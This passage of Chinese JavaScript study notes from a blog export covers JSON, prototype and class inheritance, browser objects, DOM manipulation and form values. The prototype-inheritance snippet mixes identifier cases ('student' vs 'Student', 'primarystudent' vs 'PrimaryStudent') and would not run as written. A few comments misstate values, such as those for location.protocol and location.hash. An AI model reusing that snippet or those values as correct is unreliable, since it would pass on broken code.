<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><code>JSON</code>是<code>JavaScript Object Notation</code>的缩写，它是一种数据交换格式,并且JSON定死了编码必须是<code>UTF-8</code>。</p>
<p>json的数据类型</p>
<blockquote>
<p>number：和JavaScript的number完全一致；<br>Boolean：就是JavaScript的true或false；<br>string：就是JavaScript的string；<br>null：就是JavaScript的null；<br>array：就是JavaScript的Array表示方式——[]；<br>object：就是JavaScript的{ … }表示方式。</p>
</blockquote>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><code>js--&gt;json</code>，直接用例子理解吧</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    age: <span class="number">14</span>,</span><br><span class="line">    gender: <span class="literal">true</span>,</span><br><span class="line">    height: <span class="number">1.65</span>,</span><br><span class="line">    grade: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;middle-school&#x27;</span>: <span class="string">&#x27;\&quot;W3C\&quot; Middle School&#x27;</span>,</span><br><span class="line">    skills: [<span class="string">&#x27;JavaScript&#x27;</span>, <span class="string">&#x27;Java&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>, <span class="string">&#x27;Lisp&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming);  <span class="comment">//把这个对象序列化成JSON格式的字符串</span></span><br><span class="line"><span class="built_in">console</span>.log(s);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>筛选对象的键值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(xiaoming, [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;skills&#x27;</span>], <span class="string">&#x27;  &#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;小明&quot;</span>,</span><br><span class="line">  <span class="string">&quot;skills&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;JavaScript&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Java&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Lisp&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    </p>
</blockquote>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>JSON –&gt; JS</p>
<p>用<code>JSON.parse()</code>把它变成一个JavaScript对象,例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;[1,2,3,true]&#x27;</span>); <span class="comment">// [1, 2, 3, true]</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;name&quot;:&quot;小明&quot;,&quot;age&quot;:14&#125;&#x27;</span>); <span class="comment">// Object &#123;name: &#x27;小明&#x27;, age: 14&#125;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;true&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;123.45&#x27;</span>); <span class="comment">// 123.45</span></span><br></pre></td></tr></table></figure>














<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X06)</title>
    <url>/JS_0X06/</url>
    <content><![CDATA[<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><blockquote>
<p>先用实例举例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> robot = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.6</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这时候调用<code>robot.run()</code>就会得到<code>Robot is running</code></p>
<p>然后再创建一个<code>xiaoming</code>，让小明集成<code>robot</code>，小明就也可以调用<code>run</code>了.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Student = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.2</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.__proto__ = Student;</span><br><span class="line">xiaoming.run();  <span class="comment">//让小明来调用run</span></span><br></pre></td></tr></table></figure>


</blockquote>
<p>更高级的方法，看起来也更实用，写一个函数来创建<code>xiaoming</code>，上述方法会直接改变对象的原型，不太好。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型对象:</span></span><br><span class="line"><span class="keyword">var</span> Student = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.2</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createStudent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 基于Student原型创建一个新对象:</span></span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">Object</span>.create(Student);</span><br><span class="line">    <span class="comment">// 初始化新对象:</span></span><br><span class="line">    s.name = name;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = createStudent(<span class="string">&#x27;小明&#x27;</span>);</span><br><span class="line">xiaoming.run(); <span class="comment">// 小明 is running...</span></span><br><span class="line">xiaoming.__proto__ === Student; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h1 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h1><p>汪</p>
<h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>除了直接用<code>&#123; ... &#125;</code>创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">//用new来调用</span></span><br><span class="line">xiaoming.name; <span class="comment">// &#x27;小明&#x27;    //返回一个对象</span></span><br><span class="line">xiaoming.hello(); <span class="comment">// Hello, 小明!</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：在strict模式下，<code>this.name = name</code>将报错，因为<code>this</code>绑定为<code>undefined</code>，在非strict模式下，<code>this.name = name</code>不报错，因为<code>this</code>绑定为<code>window</code>，于是无意间创建了全局变量<code>name</code></p>
</blockquote>
<h1 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h1><p>JavaScript的原型继承实现方式就是：</p>
<blockquote>
<ol>
<li>定义新的构造函数，并在内部用<code>call()</code>调用希望“继承”的构造函数，并绑定<code>this</code>；</li>
<li>借助中间函数<code>F</code>实现原型链继承，最好通过封装的<code>inherits</code>函数完成；</li>
<li>继续在新的构造函数的原型上定义新方法。</li>
</ol>
</blockquote>
<p>例：基于<code>student</code>扩展<code>primarystudent</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrimaryStudent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用Student构造函数，绑定this变量:</span></span><br><span class="line">    Student.call(<span class="built_in">this</span>, props);</span><br><span class="line">    <span class="built_in">this</span>.grade = props.grade || <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个空函数F</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//F指向stu.prototype</span></span><br><span class="line">F.prototype = student.prototype;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pri-stu指向一个新的F对象,而此时F正好是指向stu.prototype的。</span></span><br><span class="line">primarystudent.prototype = <span class="keyword">new</span> F();</span><br><span class="line"></span><br><span class="line"><span class="comment">//把pri-stu的构造函数修复为pri-stu</span></span><br><span class="line">PrimaryStudent.prototype.constructor = PrimaryStudent;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在F上定义方法</span></span><br><span class="line">primarystudent.prototype.getGrade = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.grade;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h1><blockquote>
<p>代码对比看的就比较清晰了</p>
</blockquote>
<h3 id="函数实现方法"><a href="#函数实现方法" class="headerlink" title="函数实现方法"></a>函数实现方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="Class实现方法"><a href="#Class实现方法" class="headerlink" title="Class实现方法"></a>Class实现方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">hello</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用的时候是一样的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;小明&#x27;</span>);</span><br><span class="line">xiaoming.hello();</span><br></pre></td></tr></table></figure>
<h1 id="Class继承"><a href="#Class继承" class="headerlink" title="Class继承"></a>Class继承</h1><p>class继承代码量少了许多，而且直接通过extends来实现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name, grade</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name); <span class="comment">// 记得用super调用父类的构造方法!</span></span><br><span class="line">        <span class="built_in">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">myGrade</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        alert(<span class="string">&#x27;I am at grade &#x27;</span> + <span class="built_in">this</span>.grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X07)</title>
    <url>/JS_0X07/</url>
    <content><![CDATA[<h1 id="浏览器对象"><a href="#浏览器对象" class="headerlink" title="浏览器对象"></a>浏览器对象</h1><h2 id="window"><a href="#window" class="headerlink" title="window"></a>window</h2><p>​    <code>window</code>对象有<code>innerWidth</code>和<code>innerHeight</code>属性，可获取浏览器窗口的高和宽。</p>
<p>​    <code>outerWidth</code>和<code>outerHeight</code>属性，可以获取浏览器窗口的整个宽高。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;window inner size: &#x27;</span> + <span class="built_in">window</span>.innerWidth + <span class="string">&#x27; x &#x27;</span> + <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">//显示当前浏览器的内部高和宽</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;window inner size: &#x27;</span> + <span class="built_in">window</span>.outerWidth + <span class="string">&#x27; x &#x27;</span> + <span class="built_in">window</span>.outerHeight);</span><br><span class="line"><span class="comment">//获取浏览器窗口的整个宽高。</span></span><br></pre></td></tr></table></figure>
<h2 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h2><p><code>navigator</code>对象表示浏览器的信息，最常用的属性包括：</p>
<ul>
<li>navigator.appName：浏览器名称；</li>
<li>navigator.appVersion：浏览器版本；</li>
<li>navigator.language：浏览器设置的语言；</li>
<li>navigator.platform：操作系统类型；</li>
<li>navigator.userAgent：浏览器设定的<code>User-Agent</code>字符串。</li>
</ul>
<h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><p><code>screen</code>对象表示屏幕的信息，常用的属性有：</p>
<ul>
<li>screen.width：屏幕宽度，以像素为单位；</li>
<li>screen.height：屏幕高度，以像素为单位；</li>
<li>screen.colorDepth：返回颜色位数，如8、16、24。</li>
</ul>
<h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><p><code>location</code>对象表示当前页面的URL信息。例如，一个完整的URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com:8080&#x2F;path&#x2F;index.html?a&#x3D;1&amp;b&#x3D;2#TOP</span><br></pre></td></tr></table></figure>
<p>可以用<code>location.href</code>获取。要获得URL各个部分的值，可以这么写：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">location.protocol; <span class="comment">// &#x27;http&#x27;</span></span><br><span class="line">location.host; <span class="comment">// &#x27;www.example.com&#x27;</span></span><br><span class="line">location.port; <span class="comment">// &#x27;8080&#x27;</span></span><br><span class="line">location.pathname; <span class="comment">// &#x27;/path/index.html&#x27;</span></span><br><span class="line">location.search; <span class="comment">// &#x27;?a=1&amp;b=2&#x27;</span></span><br><span class="line">location.hash; <span class="comment">// &#x27;TOP&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p><code>document</code>对象表示<strong>当前页面</strong>。由于HTML在浏览器中以DOM形式表示为树形结构，<code>document</code>对象就是整个DOM树的根节点。</p>
<p><code>document</code>的<code>title</code>属性是从HTML文档中的<code>&lt;title&gt;xxx&lt;/title&gt;</code>读取的</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p><code>history</code>对象保存了浏览器的历史记录，JavaScript可以调用<code>history</code>对象的<code>back()</code>或<code>forward ()</code>，相当于用户点击了浏览器的“后退”或“前进”按钮。</p>
<p>这个对象属于历史遗留对象，对于现代Web页面来说，由于大量使用AJAX和页面交互，简单粗暴地调用<code>history.back()</code>可能会让用户感到非常愤怒。</p>
<p>新手开始设计Web页面时喜欢在登录页登录成功时调用<code>history.back()</code>，试图回到登录前的页面。这是一种错误的方法。</p>
<p>任何情况，你都不应该使用<code>history</code>这个对象了。</p>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X08)</title>
    <url>/JS_0X08/</url>
    <content><![CDATA[<h1 id="操作DOM（浏览器）"><a href="#操作DOM（浏览器）" class="headerlink" title="操作DOM（浏览器）"></a>操作DOM（浏览器）</h1><p>HTML文档被浏览器解析后就是一棵DOM树，操作DOM的方式：</p>
<blockquote>
<ul>
<li>更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容；</li>
<li>遍历：遍历该DOM节点下的子节点，以便进行进一步操作；</li>
<li>添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点；</li>
<li>删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。</li>
</ul>
</blockquote>
<p>在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。</p>
<ul>
<li><p>最常用的方法是<code>document.getElementById()</code>和<code>document.getElementsByTagName()</code></p>
</li>
<li><p>以及CSS选择器<code>document.getElementsByClassName()</code></p>
<p>  例如：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回ID为&#x27;test&#x27;的节点：</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先定位ID为&#x27;test-table&#x27;的节点，再返回其内部所有tr节点：</span></span><br><span class="line"><span class="keyword">var</span> trs = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-table&#x27;</span>).getElementsByTagName(<span class="string">&#x27;tr&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先定位ID为&#x27;test-div&#x27;的节点，再返回其内部所有class包含red的节点：</span></span><br><span class="line"><span class="keyword">var</span> reds = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-div&#x27;</span>).getElementsByClassName(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取节点test下的所有直属子节点:</span></span><br><span class="line"><span class="keyword">var</span> cs = test.children;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取节点test下第一个、最后一个子节点：</span></span><br><span class="line"><span class="keyword">var</span> first = test.firstElementChild;</span><br><span class="line"><span class="keyword">var</span> last = test.lastElementChild;</span><br></pre></td></tr></table></figure>
<p>  第二种方法是使用<code>querySelector()</code>和<code>querySelectorAll()</code>，需要了解selector语法，然后使用条件来获取节点，更加方便：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过querySelector获取ID为q1的节点：</span></span><br><span class="line"><span class="keyword">var</span> q1 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#q1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过querySelectorAll获取q1节点内的符合条件的所有节点：</span></span><br><span class="line"><span class="keyword">var</span> ps = q1.querySelectorAll(<span class="string">&#x27;div.highlighted &gt; p&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="更新DOM"><a href="#更新DOM" class="headerlink" title="更新DOM"></a>更新DOM</h1></li>
</ul>
<p>直接修改节点的文本，方法有两种：</p>
<ul>
<li><p>一种是修改<code>innerHTML</code>属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取&lt;p id=&quot;p-id&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p-id&#x27;</span>);</span><br><span class="line"><span class="comment">// 设置文本为abc:</span></span><br><span class="line">p.innerHTML = <span class="string">&#x27;ABC&#x27;</span>; <span class="comment">// &lt;p id=&quot;p-id&quot;&gt;ABC&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// 设置HTML:</span></span><br><span class="line">p.innerHTML = <span class="string">&#x27;ABC &lt;span style=&quot;color:red&quot;&gt;RED&lt;/span&gt; XYZ&#x27;</span>;</span><br><span class="line"><span class="comment">// &lt;p&gt;...&lt;/p&gt;的内部结构已修改</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h1 id="插入DOM"><a href="#插入DOM" class="headerlink" title="插入DOM"></a>插入DOM</h1><p>向如下代码中插入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;scheme&quot;</span>&gt;</span>Scheme<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把<code>&lt;p id=&quot;js&quot;&gt;JavaScript&lt;/p&gt;</code>添加到<code>&lt;div id=&quot;list&quot;&gt;</code>的最后一项：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br><span class="line">    js = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;js&#x27;</span>),</span><br><span class="line">    list = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;list&#x27;</span>);</span><br><span class="line">list.appendChild(js);</span><br></pre></td></tr></table></figure>
<p>此时HTML的结构就变成了如下的样子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;scheme&quot;</span>&gt;</span>Scheme<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="删除DOM"><a href="#删除DOM" class="headerlink" title="删除DOM"></a>删除DOM</h1><p>要删除一个节点，首先要获得该节点本身以及它的父节点，然后，调用父节点的<code>removeChild</code>把自己删掉：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拿到待删除节点:</span></span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;to-be-removed&#x27;</span>);</span><br><span class="line"><span class="comment">// 拿到父节点:</span></span><br><span class="line"><span class="keyword">var</span> parent = self.parentElement;</span><br><span class="line"><span class="comment">// 删除:</span></span><br><span class="line"><span class="keyword">var</span> removed = parent.removeChild(self);</span><br><span class="line">removed === self; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>First<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Second<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>删除：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;parent&#x27;</span>);</span><br><span class="line">parent.removeChild(parent.children[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>




















<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X09)</title>
    <url>/JS_0X09/</url>
    <content><![CDATA[<h1 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h1><blockquote>
<p>概念：表单本身也是DOM树，表单的输入框、下拉框等可以接收用户输入，所以用JavaScript来操作表单，可以获得用户输入的内容，或者对一个输入框设置新的内容。</p>
<p>HTML表单的输入控件主要有以下几种：</p>
<ul>
<li>文本框，对应的<code>&lt;input type=&quot;text&quot;&gt;</code>，用于输入文本；</li>
<li>口令框，对应的<code>&lt;input type=&quot;password&quot;&gt;</code>，用于输入口令；</li>
<li>单选框，对应的<code>&lt;input type=&quot;radio&quot;&gt;</code>，用于选择一项；</li>
<li>复选框，对应的<code>&lt;input type=&quot;checkbox&quot;&gt;</code>，用于选择多项；</li>
<li>下拉框，对应的<code>&lt;select&gt;</code>，用于选择一项；</li>
<li>隐藏文本，对应的<code>&lt;input type=&quot;hidden&quot;&gt;</code>，用户不可见，但表单提交时会把隐藏文本发送到服务器。</li>
</ul>
</blockquote>
<h2 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h2><p>如果获得了一个input节点，就可以直接调用value获得对应的用户输入的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">input.value; <span class="comment">// &#x27;用户输入的值&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这种方式可以应用于<code>text</code>、<code>password</code>、<code>hidden</code>以及<code>select</code>。但是，对于单选框和复选框，<code>value</code>属性返回的永远是HTML预设的值，而我们需要获得的实际是用户是否“勾上了”选项，所以应该用<code>checked</code>判断：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;monday&quot; value=&quot;1&quot;&gt; Monday&lt;/label&gt;</span></span><br><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;tuesday&quot; value=&quot;2&quot;&gt; Tuesday&lt;/label&gt;</span></span><br><span class="line"><span class="keyword">var</span> mon = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;monday&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tue = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;tuesday&#x27;</span>);</span><br><span class="line">mon.value; <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line">tue.value; <span class="comment">// &#x27;2&#x27;</span></span><br><span class="line">mon.checked; <span class="comment">// true或者false</span></span><br><span class="line">tue.checked; <span class="comment">// true或者false</span></span><br></pre></td></tr></table></figure>
<h2 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h2><p>设置值和获取值类似，对于<code>text</code>、<code>password</code>、<code>hidden</code>以及<code>select</code>，直接设置<code>value</code>就可以：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">input.value = <span class="string">&#x27;test@example.com&#x27;</span>; <span class="comment">// 文本框的内容已更新</span></span><br></pre></td></tr></table></figure>
